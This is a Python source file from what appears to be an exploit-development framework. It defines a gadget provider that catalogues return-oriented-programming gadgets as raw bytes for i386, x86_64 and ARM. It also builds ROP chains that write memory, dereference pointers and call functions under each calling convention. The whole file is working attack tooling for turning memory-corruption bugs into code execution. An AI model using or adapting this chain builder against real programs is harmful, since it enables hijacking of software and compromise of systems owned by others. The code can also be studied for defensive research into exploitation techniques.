from exploit import Exploit

class CommonGadgetsExploit(Exploit):
    """Mainly add a pool of gadgets common in the various architectures."""

    def __init__(self):
        Exploit.__init__(self)

        # Good for FreeBSD

        # self.add_gadget("EM_386", "writemem", 4,
        #                 " 8b 44 24 08" + # mov    eax,DWORD PTR [esp+0x8] \
        #                 " 8b 4c 24 04" + # mov    ecx,DWORD PTR [esp+0x4] \
        #                 " 89 01" +       # mov    DWORD PTR [ecx],eax \
        #                 " c3")           # ret

        # self.add_gadget("EM_386", "cleanup", 3,
        #                 " 83 c4 0c" + # add    esp,0xc \
        #                 " c3")        # ret

        # Good for Linux

        self.add_gadget("EM_386", "writemem", 4,
                        " 8b 54 24 08" + # mov edx,DWORD PTR [esp+0x8] \
                        " 8b 44 24 04" + # mov eax,DWORD PTR [esp+0x4] \
                        " 89 10"       + # mov DWORD PTR [eax],edx \
                        " c3")           # ret

        # *(*(eax)+ecx) = ebx
        self.add_gadget("EM_386", "deref_write_with_offset", 4,
                        " 58"       + # pop eax \
                        " 5b"       + # pop ebx \
                        " 59"       + # pop ecx \
                        " 8b 00"    + # mov eax,DWORD PTR [eax] \
                        " 89 1c 08" + # mov DWORD PTR [eax+ecx*1],ebx \
                        " c3")        # ret

        self.add_gadget("EM_386", "deref_with_offset_and_save", 4,
                        " 58"       + # pop eax \
                        " 5b"       + # pop ebx \
                        " 59"       + # pop ecx \
                        " 8b 00"    + # mov eax,DWORD PTR [eax]
                        " 8b 04 18" + # mov eax,DWORD PTR [eax+ebx*1] \
                        " 89 01"    + # mov DWORD PTR [ecx],eax \
                        " c3")        # ret

        self.add_gadget("EM_386", "copy_to_stack", 4,
                        " 5b"       + # pop ebx \
                        " 59"       + # pop ecx \
                        " 8b 1b"    + # mov ebx,DWORD PTR [ebx] \
                        " 89 1c 0c" + # mov DWORD PTR [esp+ecx*1],ebx \
                        " c3")        # ret

        self.add_gadget("EM_386", "cleanup", 4,
                        " 5b" + # pop ebx \
                        " 5e" + # pop esi \
                        " 5f" + # pop edi \
                        " 5d" + # pop ebp \
                        " c3")  # ret

        # This gadget requires 6 useless parameters

        self.add_gadget("EM_X86_64", "writemem", 8,
                        " 48 8b 54 24 10" + # mov rdx,QWORD PTR [rsp+0x10] \
                        " 48 8b 44 24 08" + # mov rax,QWORD PTR [rsp+0x8] \
                        " 48 89 10"       + # mov QWORD PTR [rax],rdx \
                        " c3")              # ret

        self.add_gadget("EM_X86_64", "writemem", 8,
                        " 48 89 37"       + # mov    QWORD PTR [rdi],rsi \
                        " c3")              # ret

        self.add_gadget("EM_X86_64", "cleanup", 6,
                        " 5b"    + # pop    rbx \
                        " 5d"    + # pop    rbp \
                        " 41 5c" + # pop    r12 \
                        " 41 5d" + # pop    r13 \
                        " 41 5e" + # pop    r14 \
                        " 41 5f" + # pop    r15 \
                        " c3")     # ret

        self.add_gadget("EM_X86_64", "args", None,
                        " 4c 89 ea" +   # mov    rdx,r13 \
                        " 4c 89 f6" +   # mov    rsi,r14 \
                        " 44 89 ff" +   # mov    edi,r15d \
                        " 41 ff 14 dc") # call   QWORD PTR [r12+rbx*8]

        self.add_gadget("EM_X86_64", "deref_write_with_offset", None,
                        " 58"          + # pop    rax \
                        " 5b"          + # pop    rbx \
                        " 59"          + # pop    rcx \
                        " 48 8b 00"    + # mov    rax,QWORD PTR [rax] \
                        " 48 89 1c 08" + # mov    QWORD PTR [rax+rcx*1],rbx \
                        " c3")           # ret

        self.add_gadget("EM_X86_64", "deref_with_offset_and_save", None,
                        " 58"          + # pop    rax \
                        " 5b"          + # pop    rbx \
                        " 59"          + # pop    rcx \
                        " 48 8b 00"    + # mov    rax,QWORD PTR [rax] \
                        " 48 8b 04 18" + # mov    rax,QWORD PTR [rax+rbx*1] \
                        " 48 89 01"    + # mov    QWORD PTR [rcx],rax \
                        " c3")           # ret

        self.add_gadget("EM_X86_64", "copy_to_stack", None,
                        " 5b"          + # pop    rbx \
                        " 59"          + # pop    rcx \
                        " 48 8b 1b"    + # mov    rbx,QWORD PTR [rbx] \
                        " 48 89 1c 0c" + # mov    QWORD PTR [rsp+rcx*1],rbx \
                        " c3")           # ret

        # Assume LE

        self.add_gadget("EM_ARM", "writemem", 4,
                        " 00 10 80 e5" + # str r1, [r0] \
                        " 1e ff 2f e1")  # bx lr

        # Better not use this due to a bug in QEMU

        #self.add_gadget("EM_ARM", "prepare_regs", None,
        #                " f8 85 bd e8")  # pop {r3, r4, r5, r6, r7, r8, sl, pc}

        self.add_gadget("EM_ARM", "prepare_regs", None,
                        " f8 85 bd 08")  # popeq {r3, r4, r5, r6, r7, r8, sl, pc}

        self.add_gadget("EM_ARM", "setup_args", None,
                        " 07 00 a0 e1" + # mov r0, r7 \
                        " 08 10 a0 e1" + # mov r1, r8 \
                        " 0a 20 a0 e1" + # mov r2, sl \
                        " 01 40 84 e2" + # add r4, r4, #1 \
                        " 33 ff 2f e1" + # blx r3 \
                        " 06 00 54 e1" + # cmp r4, r6 \
                        " f7 ff ff 1a" + # bne 8604 <__libc_csu_init+0x38> \
                        " f8 85 bd e8")  # pop {r3, r4, r5, r6, r7, r8, sl, pc}

        self.add_gadget("EM_ARM", "just_ret", None,
                        " 1e ff 2f e1")  # bx      lr

    def allocate_helpers(self, buffer):
        """Allocate helper buffers needed by some specific platforms (e.g. for cleanup
        purposes)"""
        result = Exploit.allocate_helpers(self, buffer)
        if self.arch == "EM_X86_64":
            self.popret = buffer.allocate(self.pointer_size, name="popret")
            nope, nope, cleanup_location = self.get_gadget("cleanup")
            result += self.write_pointer(self.popret, self.str2ptr(cleanup_location) + 8)
        return result

    def deref_with_offset_and_save(self, pointer_address, offset, save_address):
        """Dereference the address in the given memory area (pointer_address),
        add the offset, and copy the content to the given address
        (save_address)."""
        none, none, location = self.get_gadget("deref_with_offset_and_save")
        return location + pointer_address + offset + save_address

    def write_with_offset(self, pointer_address, offset, value):
        """Dereference the address in the given memory area, add the specified
        offset and write there the specified value."""
        none, none, location = self.get_gadget("deref_write_with_offset")
        return location + pointer_address + value + offset

    def copy_to_stack(self, offset, source):
        """Copy the content of the given memory area (source) at the specified
        offset from the stack pointer. When computing the offset assume the
        following layout (assuming 32-bit pointers):

        ...
        &gadget              -12
        offset                -8
        &source               -4
        &next_return_address   0
        parameter1            +4
        ...
        """
        none, none, location = self.get_gadget("copy_to_stack")
        return location + offset + source

    def call(self, invocation, parameters):
        """ROP function invocation: return a ROP chain that sets up the arguments on the
        stack and/or on the registers, invoke the function and cleanup the
        arguments."""
        if self.arch == "EM_386":
            return self.call32(invocation, parameters)
        elif self.arch == "EM_X86_64":
            return self.call64(invocation, parameters)
        elif self.arch == "EM_ARM":
            return self.call_arm(invocation, parameters)
        else:
            raise Exception("Unsupported architecture")

    def call32(self, invocation, parameters):
        """Implements the i386 calling convention."""
        cleanup_size, nope, cleanup_location = self.get_gadget("cleanup")
        if len(parameters) > cleanup_size:
            raise Exception("Too many parameters, find a better gadget")

        prepare = invocation
        stack_frame = cleanup_location + \
                      "".join(map(str, parameters)) + \
                      self.filler * (cleanup_size - len(parameters))
        return prepare, 0, stack_frame

    def call64(self, invocation, parameters):
        """Implements the x86_64 calling convention."""
        if len(parameters) > 3:
            raise Exception("Too many parameters")
        elif self.str2ptr(parameters[0]) & 0xffffffff00000000 != 0:
            raise Exception("First parameter high part has to be 0")
        elif len(parameters) == 0:
            return invocation
        elif len(parameters) < 3:
            parameters = parameters + [self.ptr2str(0)] * (3 - len(parameters))

        nope, nope, args_location = self.get_gadget("args")
        nope, nope, cleanup_location = self.get_gadget("cleanup")
        prepare = cleanup_location
        prepare += self.ptr2str(0) # rbx
        prepare += self.ptr2str(1) # rbp == rbx + 1
        prepare += self.ptr2str(self.fini + 8) # r12, jump to pop;ret
        prepare += parameters[2] # r13 -> rdx
        prepare += parameters[1] # r14 -> rsi
        prepare += parameters[0] # r15 -> edi
        prepare += args_location # move registers; call pop;ret
        prepare += self.filler * 7
        prepare += invocation

        return prepare, len(prepare) - len(invocation), ""

    def call_arm(self, invocation, parameters):
        """Implements the ARM calling convention."""
        if len(parameters) > 3:
            raise Exception("Too many parameters, find a better gadget")
        elif len(parameters) == 0:
            return invocation
        elif len(parameters) < 3:
            parameters = parameters + [self.ptr2str(0)] * (3 - len(parameters))

        nope, nope, prepare_regs_location = self.get_gadget("prepare_regs")
        nope, nope, setup_args_location = self.get_gadget("setup_args")
        prepare = prepare_regs_location
        prepare += invocation[0:4] # r3, target of a blx
        prepare += self.ptr2str(0) # r4
        prepare += self.filler # r5
        prepare += self.ptr2str(1) # r6 == r4 + 1
        prepare += parameters[0] # r7 -> r0
        prepare += parameters[1] # r8 -> r1
        prepare += parameters[2] # sl -> r2
        prepare += setup_args_location # pc
        prepare += self.filler * 7 # pop again 7 regs + pc

        return prepare, len(prepare_regs_location), ""

    def do_writemem(self, address, value):
        """Write a pointer-sized buffer to the specfied location. This
        function uses the writemem gadget."""
        write_size, nope, location = self.get_gadget("writemem")

        remaining = ""
        if len(value) > write_size:
            remaining = value[write_size:]
            value = value[0:write_size]
        elif len(value) < write_size:
            value = value.ljust(write_size, "\0")

        # TODO: using kill for this is overkill, create a simpler gadget
        prepare, nope, stack_frame = self.call(location, [address, value])
        return remaining, prepare + stack_frame


def register_gadget_provider():
    return [("rop-chain", CommonGadgetsExploit)]
